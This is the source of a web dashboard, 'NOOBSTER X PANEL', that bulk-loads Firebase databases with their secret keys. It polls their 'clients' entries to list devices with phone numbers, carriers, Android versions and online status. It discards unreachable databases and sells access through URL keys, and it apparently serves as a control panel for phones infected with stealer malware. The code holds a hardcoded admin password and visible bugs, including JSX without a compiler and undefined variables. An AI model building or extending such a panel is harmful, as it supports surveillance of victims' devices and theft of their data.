<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
    <title>NOOBSTER X PANEL</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg: #020202; --card: #0d0d0d; --border: #1f1f1f; --text: #e8e8e8;
            --muted: #666; --red: #dc2626; --green: #22c55e; --blue: #3b82f6;
        }
        body { font-family: 'Inter', sans-serif; background: radial-gradient(at 0% 0%, rgba(59,130,246,0.08) 0px, transparent 50%), radial-gradient(at 100% 0%, rgba(139,92,246,0.08) 0px, transparent 50%), #020202; color: var(--text); min-height: 100vh; }
        .glass { background: rgba(13,13,13,0.85); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.06); }
        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 12px 20px; border-radius: 12px; font-weight: 600; font-size: 14px; cursor: pointer; border: none; transition: all 0.2s; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-primary { background: linear-gradient(135deg, #dc2626, #c2410c); color: #fff; box-shadow: 0 8px 20px -6px rgba(220,38,38,0.4); }
        .btn-secondary { background: #1a1a1a; border: 1px solid #2a2a2a; color: #aaa; }
        .btn-secondary:hover { background: #222; color: #fff; }
        .btn-danger { background: rgba(220,38,38,0.15); border: 1px solid rgba(220,38,38,0.3); color: #f87171; }
        .input { width: 100%; padding: 12px 16px; border-radius: 12px; background: #111; border: 1px solid #222; color: #fff; font-size: 14px; outline: none; transition: all 0.2s; }
        .input:focus { border-color: #dc2626; }
        .card { background: #0d0d0d; border: 1px solid #1f1f1f; border-radius: 16px; padding: 20px; }
        .badge { display: inline-flex; align-items: center; gap: 4px; padding: 3px 10px; border-radius: 999px; font-size: 11px; font-weight: 600; }
        .badge-green { background: rgba(34,197,94,0.12); color: #4ade80; border: 1px solid rgba(34,197,94,0.25); }
        .badge-red { background: rgba(220,38,38,0.12); color: #f87171; border: 1px solid rgba(220,38,38,0.25); }
        .badge-amber { background: rgba(245,158,11,0.12); color: #fbbf24; border: 1px solid rgba(245,158,11,0.25); }
        .spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .fade-in { animation: fadeIn 0.4s ease-out; }
        .grid { display: grid; gap: 16px; }
        .grid-2 { grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); }
        .tabs { display: flex; gap: 4px; border-bottom: 1px solid #1a1a1a; margin-bottom: 20px; overflow-x: auto; }
        .tab { padding: 12px 18px; font-size: 13px; font-weight: 600; color: #555; border: none; background: none; cursor: pointer; border-bottom: 2px solid transparent; transition: all 0.2s; white-space: nowrap; }
        .tab.active { color: #f87171; border-bottom-color: #dc2626; }
        .device-card { background: #000; border: 1px solid #1f1f1f; border-radius: 16px; padding: 14px; transition: all 0.2s; }
        .stat-card { background: #0d0d0d; border: 1px solid #1f1f1f; border-radius: 14px; padding: 16px; }
        .stat-value { font-size: 28px; font-weight: 900; line-height: 1; margin-top: 6px; }
        .stat-label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: #555; font-weight: 600; }
        .toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: #1a1a1a; border: 1px solid #2a2a2a; color: #fff; padding: 14px 24px; border-radius: 14px; font-size: 14px; font-weight: 600; z-index: 99999; box-shadow: 0 10px 30px rgba(0,0,0,0.6); animation: fadeIn 0.3s ease-out; }
        .toast.error { border-color: rgba(220,38,38,0.4); color: #f87171; }
        .toast.success { border-color: rgba(34,197,94,0.4); color: #4ade80; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="root"></div>

    <script>
        // ============================================================
        // ADMIN CONFIG
        // ============================================================
        const ADMIN_PASSWORD = "Noobster@2024"; 
        const ADMIN_USERNAME = "@Noobstar9";
        const TELEGRAM_CHANNEL = "https://t.me/firebase1991";

        // ============================================================
        // LOCAL STORAGE DATABASE
        // ============================================================
        const DB = {
            get: (k, def = null) => { try { const v = localStorage.getItem(k); return v ? JSON.parse(v) : def; } catch { return def; } },
            set: (k, v) => { try { localStorage.setItem(k, JSON.stringify(v)); } catch {} },
            del: (k) => { try { localStorage.removeItem(k); } catch {} }
        };

        const KEYS = {
            adminSession: "nb_admin_session",
            firebaseAccs: "nb_firebase_accs",
            apiKeys: "nb_api_keys",
            panelStatus: "nb_panel_status"
        };

        // Default Values
        if (!DB.get(KEYS.panelStatus)) {
            DB.set(KEYS.panelStatus, { online: true, broadcast: "" });
        }
        if (!DB.get(KEYS.apiKeys)) {
            // Default custom API key
            DB.set(KEYS.apiKeys, [{ id: 1, name: "Main API", key: "MY-WEB.SITE/v2/SLJSNSN19AJA", active: true }]);
        }

        // ============================================================
        // API & FIREBASE LOGIC
        // ============================================================
        async function fetchFirebase(url, key, path) {
            let u = url.trim().replace(/\/$/, "");
            if (!u.startsWith("http")) u = "https://" + u;
            const res = await fetch(`${u}/${path}.json?auth=${key.trim()}`);
            if (!res.ok) {
                if (res.status === 401 || res.status === 403) throw new Error("PERMISSION_DENIED");
                throw new Error(`HTTP_${res.status}`);
            }
            return res.json();
        }

        function parseDevices(data) {
            const out = [];
            if (!data || typeof data !== "object") return out;
            for (const [id, d] of Object.entries(data)) {
                if (!d || typeof d !== "object") continue;
                let sims = Array.isArray(d.sims) ? d.sims : (d.sims ? Object.values(d.sims) : []);
                const battery = String(d.battery ?? "—");
                out.push({
                    id,
                    name: String(d.modelName || d.model || d.deviceName || id),
                    battery: battery,
                    batteryPercent: parseInt(battery.replace("%", "")) || 0,
                    status: !!d.status,
                    phoneNumber: String(d.mobNo || (sims[0]?.phoneNumber ?? "—")),
                    android: String(d.androidV || d.androidVersion || "—"),
                    provider: String(d.service_provider || "—"),
                    _accountUrl: url,
                    _accountKey: key
                });
            }
            return out;
        }

        function formatTime(ms) {
            if (!ms) return "—";
            const diff = Date.now() - ms;
            const m = Math.floor(diff / 60000);
            if (m < 60) return `${m}m ago`;
            return `${Math.floor(m/60)}h ago`;
        }

        // ============================================================
        // REACT APP
        // ============================================================
        const { useState, useEffect, useCallback } = React;

        // -- TOAST --
        function useToast() {
            const [toasts, setToasts] = useState([]);
            const push = useCallback((msg, type = "info") => {
                const id = Date.now() + Math.random();
                setToasts(t => [...t, { id, msg, type }]);
                setTimeout(() => setToasts(t => t.filter(x => x.id !== id)), 3000);
            }, []);
            return { toasts, push };
        }

        // -- ICONS --
        const Icon = ({ name, size = 16 }) => {
            const icons = {
                search: <><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></>,
                refresh: <><path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/><path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"/><path d="M8 16H3v5"/></>,
                logout: <><path d="m16 17 5-5-5-5"/><path d="M21 12H9"/><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/></>,
                plus: <><path d="M5 12h14"/><path d="M12 5v14"/></>,
                trash: <><path d="M10 11v6"/><path d="M14 11v6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/><path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></>,
                x: <><path d="M18 6 6 18"/><path d="m6 6 12 12"/></>,
                shield: <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>,
                zap: <path d="M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"/>,
                send: <><path d="M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z"/><path d="m21.854 2.147-10.94 10.939"/></>,
                database: <><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5V19A9 3 0 0 0 21 19V5"/><path d="M3 12A9 3 0 0 0 21 12"/></>,
                power: <><path d="M12 2v10"/><path d="M18.4 6.6a9 9 0 1 1-12.77.04"/></>,
                megaphone: <><path d="m3 11 18-5v12L3 14v-3z"/><path d="M11.6 16.8a3 3 0 1 1-5.8-1.6"/></>,
                wifi: <><path d="M12 20h.01"/><path d="M2 8.82a15 15 0 0 1 20 0"/><path d="M5 12.859a10 10 0 0 1 14 0"/><path d="M8.5 16.429a5 5 0 0 1 7 0"/></>,
                key: <><circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3L22 7l-3-3"/></>
            };
            return <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">{icons[name]}</svg>;
        };

        // -- ADMIN LOGIN --
        function AdminLogin({ onSuccess }) {
            const [pass, setPass] = useState("");
            const [err, setErr] = useState("");

            const handleLogin = (e) => {
                e.preventDefault();
                if (pass === ADMIN_PASSWORD) {
                    DB.set(KEYS.adminSession, { loggedIn: true });
                    onSuccess();
                } else {
                    setErr("Invalid password");
                }
            };

            return (
                <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: "20px" }}>
                    <div className="glass fade-in" style={{ borderRadius: "24px", padding: "40px 32px", maxWidth: "400px", width: "100%" }}>
                        <div style={{ textAlign: "center", marginBottom: "28px" }}>
                            <div style={{ width: "64px", height: "64px", borderRadius: "18px", background: "linear-gradient(135deg, #dc2626, #f97316)", display: "inline-flex", alignItems: "center", justifyContent: "center", marginBottom: "16px" }}>
                                <Icon name="shield" size={28} />
                            </div>
                            <h1 style={{ fontSize: "24px", fontWeight: 900 }}>Admin Access</h1>
                        </div>
                        <form onSubmit={handleLogin}>
                            <input type="password" value={pass} onChange={e => setPass(e.target.value)} placeholder="Enter Admin Password" className="input" autoFocus />
                            {err && <p style={{ fontSize: "12px", color: "#f87171", marginTop: "8px" }}>{err}</p>}
                            <button type="submit" className="btn btn-primary" style={{ width: "100%", marginTop: "20px" }}>Login</button>
                        </form>
                        <p style={{ textAlign: "center", fontSize: "11px", color: "#444", marginTop: "20px" }}>Admin: {ADMIN_USERNAME}</p>
                    </div>
                </div>
            );
        }

        // -- ADMIN DASHBOARD --
        function AdminDashboard({ onLogout, toast }) {
            const [tab, setTab] = useState("dashboard");
            const [accs, setAccs] = useState(() => DB.get(KEYS.firebaseAccs, []));
            const [apiKeys, setApiKeys] = useState(() => DB.get(KEYS.apiKeys, []));
            const [status, setStatus] = useState(() => DB.get(KEYS.panelStatus, { online: true, broadcast: "" }));
            
            const [devices, setDevices] = useState([]);
            const [loading, setLoading] = useState(false);

            // Bulk State
            const [bulkText, setBulkText] = useState("");
            // API State
            const [newApiName, setNewApiName] = useState("");
            const [newApiKey, setNewApiKey] = useState("");
            // Broadcast
            const [broadcastMsg, setBroadcastMsg] = useState(status.broadcast || "");

            // Save to storage
            const saveAccs = (list) => { setAccs(list); DB.set(KEYS.firebaseAccs, list); };
            const saveApis = (list) => { setApiKeys(list); DB.set(KEYS.apiKeys, list); };
            const saveStatus = (s) => { setStatus(s); DB.set(KEYS.panelStatus, s); };

            // Load Devices Function (Auto-Remove Dead Firebase)
            const loadDevices = useCallback(async (silent = false) => {
                if (!silent) setLoading(true);
                const currentAccs = DB.get(KEYS.firebaseAccs, []);
                let allDevs = [];
                let failedAccs = [];

                await Promise.all(currentAccs.map(async (acc) => {
                    try {
                        const data = await fetchFirebase(acc.url, acc.key, "clients");
                        const devs = parseDevices(data);
                        devs.forEach(d => { d._accountName = acc.name || "Firebase"; });
                        allDevs.push(...devs);
                    } catch (err) {
                        // Auto remove if 403 or network error
                        failedAccs.push(acc.id);
                    }
                }));

                // Auto-remove failed firebases
                if (failedAccs.length > 0) {
                    const filtered = currentAccs.filter(a => !failedAccs.includes(a.id));
                    saveAccs(filtered);
                    if (!silent) toast.push(`${failedAccs.length} dead Firebase accounts removed`, "error");
                }

                setDevices(allDevs);
                if (!silent) setLoading(false);
            }, [toast]);

            useEffect(() => {
                loadDevices();
                const iv = setInterval(() => loadDevices(true), 20000);
                return () => clearInterval(iv);
            }, [loadDevices]);

            const handleBulkAdd = async () => {
                const lines = bulkText.split("\n").map(l => l.trim()).filter(Boolean);
                if (lines.length === 0) return toast.push("Paste Firebase URLs + keys", "error");
                
                let newAccs = [];
                for (const line of lines) {
                    const parts = line.split(/[|,;\t]/).map(p => p.trim());
                    if (parts.length >= 2) {
                        let url = parts[0];
                        if (!url.startsWith("http")) url = "https://" + url;
                        newAccs.push({ id: Date.now() + Math.random(), name: parts[2] || url.split("//")[1].split(".")[0], url, key: parts[1] });
                    }
                }
                if (newAccs.length > 0) {
                    const updated = [...accs, ...newAccs];
                    saveAccs(updated);
                    setBulkText("");
                    toast.push(`${newAccs.length} Firebases Added!`, "success");
                    loadDevices();
                }
            };

            const handleAddApi = () => {
                if (!newApiName || !newApiKey) return toast.push("Fill all API fields", "error");
                const newKey = { id: Date.now(), name: newApiName, key: newApiKey, active: true };
                const updated = [...apiKeys, newKey];
                saveApis(updated);
                setNewApiName(""); setNewApiKey("");
                toast.push("API Key Created", "success");
            };

            const stats = {
                total: devices.length,
                online: devices.filter(d => d.status).length,
                offline: devices.filter(d => !d.status).length,
                accs: accs.length,
                apis: apiKeys.length
            };

            return (
                <div style={{ minHeight: "100vh", paddingBottom: "40px" }}>
                    <header style={{ background: "rgba(10,10,10,0.85)", backdropFilter: "blur(20px)", borderBottom: "1px solid #1a1a1a", padding: "14px 24px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                            <div style={{ width: "32px", height: "32px", borderRadius: "10px", background: "linear-gradient(135deg, #dc2626, #f97316)", display: "flex", alignItems: "center", justifyContent: "center" }}>
                                <Icon name="shield" size={16} color="#fff" />
                            </div>
                            <span style={{ fontSize: "16px", fontWeight: 800 }}>Admin Panel</span>
                        </div>
                        <button className="btn btn-secondary" onClick={onLogout}><Icon name="logout" size={14} /> Logout</button>
                    </header>

                    <main style={{ maxWidth: "1200px", margin: "0 auto", padding: "24px" }}>
                        <div className="tabs">
                            {["dashboard", "bulk_firebase", "api_keys", "control"].map(t => (
                                <button key={t} className={`tab ${tab === t ? "active" : ""}`} onClick={() => setTab(t)}>
                                    {t.replace("_", " ").toUpperCase()}
                                </button>
                            ))}
                        </div>

                        {tab === "dashboard" && (
                            <div className="fade-in">
                                <div className="grid" style={{ gridTemplateColumns: "repeat(auto-fill, minmax(150px, 1fr))", marginBottom: "24px" }}>
                                    <div className="stat-card"><div className="stat-label">Total Devices</div><div className="stat-value">{stats.total}</div></div>
                                    <div className="stat-card"><div className="stat-label">Online</div><div className="stat-value" style={{ color: "#22c55e" }}>{stats.online}</div></div>
                                    <div className="stat-card"><div className="stat-label">Offline</div><div className="stat-value" style={{ color: "#666" }}>{stats.offline}</div></div>
                                    <div className="stat-card"><div className="stat-label">Firebase DB</div><div className="stat-value" style={{ color: "#60a5fa" }}>{stats.accs}</div></div>
                                    <div className="stat-card"><div className="stat-label">API Keys</div><div className="stat-value" style={{ color: "#fbbf24" }}>{stats.apis}</div></div>
                                </div>
                                <div className="grid grid-2">
                                    {devices.map(d => (
                                        <div key={d.id + d._accountName} className="device-card">
                                            <div style={{ display: "flex", justifyContent: "space-between", marginBottom: "8px" }}>
                                                <div style={{ fontWeight: 700, fontSize: "13px" }}>{d.name}</div>
                                                <span className={`badge ${d.status ? "badge-green" : "badge-red"}`}>{d.status ? "Online" : "Offline"}</span>
                                            </div>
                                            <div style={{ fontSize: "11px", color: "#888" }}>Phone: {d.phoneNumber} | Bat: {d.battery}</div>
                                            <div style={{ fontSize: "10px", color: "#555", marginTop: "8px" }}>Source: {d._accountName}</div>
                                        </div>
                                    ))}
                                </div>
                            </div>
                        )}

                        {tab === "bulk_firebase" && (
                            <div className="card fade-in">
                                <h2 style={{ fontSize: "16px", marginBottom: "10px" }}>Bulk Add Firebase (100+)</h2>
                                <p style={{ fontSize: "12px", color: "#666", marginBottom: "16px" }}>Format: URL | KEY | NAME (One per line)</p>
                                <textarea className="input" rows={10} value={bulkText} onChange={e => setBulkText(e.target.value)} placeholder="https://app1.firebaseio.com | SECRET_KEY | App 1" style={{ fontFamily: "monospace" }} />
                                <button className="btn btn-primary" onClick={handleBulkAdd} style={{ marginTop: "16px" }}>Save & Load Firebases</button>
                            </div>
                        )}

                        {tab === "api_keys" && (
                            <div className="card fade-in">
                                <h2 style={{ fontSize: "16px", marginBottom: "10px" }}>Custom API Keys</h2>
                                <p style={{ fontSize: "12px", color: "#666", marginBottom: "16px" }}>Use these URLs to access the panel without Firebase logic.</p>
                                
                                <div style={{ display: "flex", gap: "10px", marginBottom: "20px", flexWrap: "wrap" }}>
                                    <input className="input" placeholder="API Name (e.g. My Site)" value={newApiName} onChange={e => setNewApiName(e.target.value)} style={{ flex: 1, minWidth: "200px" }} />
                                    <input className="input" placeholder="Key (e.g. v2/XYZ123)" value={newApiKey} onChange={e => setNewApiKey(e.target.value)} style={{ flex: 1, minWidth: "200px" }} />
                                    <button className="btn btn-primary" onClick={handleAddApi}><Icon name="plus" size={14} /> Add</button>
                                </div>

                                {apiKeys.map(api => (
                                    <div key={api.id} style={{ display: "flex", alignItems: "center", justifyContent: "space-between", background: "#111", padding: "12px", borderRadius: "10px", marginBottom: "8px", border: "1px solid #222" }}>
                                        <div>
                                            <div style={{ fontSize: "13px", fontWeight: 700 }}>{api.name}</div>
                                            <div style={{ fontSize: "11px", color: "#60a5fa", fontFamily: "monospace" }}>/{api.key}</div>
                                        </div>
                                        <button className="btn btn-danger" onClick={() => saveApis(apiKeys.filter(a => a.id !== api.id))}><Icon name="trash" size={14} /></button>
                                    </div>
                                ))}
                            </div>
                        )}

                        {tab === "control" && (
                            <div className="card fade-in">
                                <h2 style={{ fontSize: "16px", marginBottom: "16px" }}>Panel Control</h2>
                                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px", background: status.online ? "rgba(34,197,94,0.08)" : "rgba(220,38,38,0.08)", border: `1px solid ${status.online ? "rgba(34,197,94,0.3)" : "rgba(220,38,38,0.3)"}`, borderRadius: "12px", marginBottom: "20px" }}>
                                    <div style={{ fontWeight: 700 }}>Server Status: <span style={{ color: status.online ? "#4ade80" : "#f87171" }}>{status.online ? "ONLINE" : "OFFLINE"}</span></div>
                                    <button className={`btn ${status.online ? "btn-danger" : "btn-primary"}`} onClick={() => { const s = {...status, online: !status.online}; saveStatus(s); toast.push("Status updated"); }}>Turn {status.online ? "OFF" : "ON"}</button>
                                </div>
                                <h3 style={{ fontSize: "14px", marginBottom: "10px" }}>Broadcast Message</h3>
                                <textarea className="input" rows={3} value={broadcastMsg} onChange={e => setBroadcastMsg(e.target.value)} placeholder="Type message for public..." />
                                <button className="btn btn-primary" onClick={() => { const s = {...status, broadcast: broadcastMsg}; saveStatus(s); toast.push("Broadcast Sent!"); }} style={{ marginTop: "10px" }}>Send Broadcast</button>
                            </div>
                        )}
                    </main>
                </div>
            );
        }

        // -- PUBLIC PANEL --
        function PublicPanel({ onAdminClick }) {
            const [status, setStatus] = useState(() => DB.get(KEYS.panelStatus, { online: true, broadcast: "" }));
            const [devices, setDevices] = useState([]);
            const [loading, setLoading] = useState(true);

            // API Key Auth Logic
            const urlPath = window.location.pathname;
            const apiKeys = DB.get(KEYS.apiKeys, []);
            const isValidApi = apiKeys.some(k => urlPath.includes(k.key) && k.active);

            useEffect(() => {
                if (!status.online || !isValidApi) { setLoading(false); return; }
                
                const load = async () => {
                    const accs = DB.get(KEYS.firebaseAccs, []);
                    let all = [];
                    await Promise.all(accs.map(async (acc) => {
                        try {
                            const data = await fetchFirebase(acc.url, acc.key, "clients");
                            const devs = parseDevices(data);
                            devs.forEach(d => d._accountName = acc.name);
                            all.push(...devs);
                        } catch {}
                    }));
                    setDevices(all);
                    setLoading(false);
                };
                load();
                const iv = setInterval(load, 20000);
                return () => clearInterval(iv);
            }, [status.online, isValidApi]);

            // INVALID API / OFFLINE UI
            if (!isValidApi || !status.online) {
                return (
                    <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: "20px" }}>
                        <div className="glass" style={{ borderRadius: "24px", padding: "48px 32px", maxWidth: "420px", textAlign: "center" }}>
                            <div style={{ width: "80px", height: "80px", borderRadius: "24px", background: "rgba(220,38,38,0.15)", border: "1px solid rgba(220,38,38,0.3)", display: "inline-flex", alignItems: "center", justifyContent: "center", marginBottom: "20px", margin: "0 auto 20px" }}>
                                <Icon name="shield" size={36} color="#f87171" />
                            </div>
                            <h1 style={{ fontSize: "24px", fontWeight: 900, color: "#f87171", marginBottom: "8px" }}>Access Denied</h1>
                            <p style={{ fontSize: "14px", color: "#888" }}>Invalid API Key or Server is Offline.</p>
                            {status.broadcast && (
                                <div style={{ marginTop: "20px", padding: "14px", background: "rgba(245,158,11,0.08)", border: "1px solid rgba(245,158,11,0.25)", borderRadius: "12px" }}>
                                    <p style={{ fontSize: "13px", color: "#fbbf24" }}>📢 {status.broadcast}</p>
                                </div>
                            )}
                            <button className="btn btn-secondary" onClick={onAdminClick} style={{ marginTop: "24px" }}>Admin Login</button>
                        </div>
                    </div>
                );
            }

            // VALID PUBLIC UI
            return (
                <div style={{ minHeight: "100vh" }}>
                    <header style={{ background: "rgba(10,10,10,0.85)", backdropFilter: "blur(20px)", borderBottom: "1px solid #1a1a1a", padding: "14px 24px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                            <div style={{ width: "32px", height: "32px", borderRadius: "10px", background: "linear-gradient(135deg, #dc2626, #f97316)", display: "flex", alignItems: "center", justifyContent: "center" }}>
                                <Icon name="zap" size={16} color="#fff" />
                            </div>
                            <span style={{ fontSize: "16px", fontWeight: 800 }}><span style={{color:"#6acfff"}}>NOOBSTER</span> X PANEL</span>
                        </div>
                        <a href={TELEGRAM_CHANNEL} target="_blank" className="btn btn-secondary" style={{ padding: "8px 14px", fontSize: "12px" }}><Icon name="send" size={14}/> Telegram</a>
                    </header>

                    {status.broadcast && (
                        <div style={{ background: "rgba(245,158,11,0.1)", borderBottom: "1px solid rgba(245,158,11,0.3)", padding: "10px", textAlign: "center", fontSize: "13px", color: "#fbbf24" }}>
                            📢 {status.broadcast}
                        </div>
                    )}

                    <main style={{ maxWidth: "1200px", margin: "0 auto", padding: "24px" }}>
                        <div style={{ display: "flex", justifyContent: "space-between", marginBottom: "20px" }}>
                            <h1 style={{ fontSize: "20px", fontWeight: 800 }}>Live Devices</h1>
                            <div style={{ display: "flex", gap: "8px" }}>
                                <span className="badge badge-green">{devices.filter(d => d.status).length} Online</span>
                                <span className="badge badge-red">{devices.filter(d => !d.status).length} Offline</span>
                            </div>
                        </div>
                        
                        {loading ? (
                            <div style={{ textAlign: "center", padding: "60px" }}><div className="spinner" style={{ margin: "0 auto" }} /></div>
                        ) : (
                            <div className="grid grid-2">
                                {devices.map(d => (
                                    <div key={d.id + d._accountName} className="device-card">
                                        <div style={{ display: "flex", justifyContent: "space-between", marginBottom: "8px" }}>
                                            <div style={{ fontWeight: 700, fontSize: "13px" }}>{d.name}</div>
                                            <span className={`badge ${d.status ? "badge-green" : "badge-red"}`}>{d.status ? "Online" : "Offline"}</span>
                                        </div>
                                        <div style={{ fontSize: "12px", color: "#888", display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px" }}>
                                            <div><span style={{color:"#555"}}>Android:</span> {d.android}</div>
                                            <div><span style={{color:"#555"}}>Battery:</span> {d.battery}</div>
                                            <div><span style={{color:"#555"}}>Phone:</span> {d.phoneNumber}</div>
                                            <div><span style={{color:"#555"}}>Network:</span> {d.provider}</div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}
                    </main>
                </div>
            );
        }

        // -- APP ROUTER --
        function App() {
            const [adminSession, setAdminSession] = useState(() => DB.get(KEYS.adminSession, null));
            const [showAdmin, setShowAdmin] = useState(false);
            const { toasts, push } = useToast();

            let view;
            if (adminSession?.loggedIn) {
                view = <AdminDashboard onLogout={() => { DB.del(KEYS.adminSession); setAdminSession(null); }} toast={push} />;
            } else if (showAdmin) {
                view = <AdminLogin onSuccess={() => setAdminSession(DB.get(KEYS.adminSession))} />;
            } else {
                view = <PublicPanel onAdminClick={() => setShowAdmin(true)} />;
            }

            return (
                <>
                    {view}
                    {toasts.map(t => <div key={t.id} className={`toast ${t.type}`}>{t.msg}</div>)}
                </>
            );
        }

        ReactDOM.createRoot(document.getElementById("root")).render(<App />);
    </script>

    <!-- React CDN -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
</body>
</html>
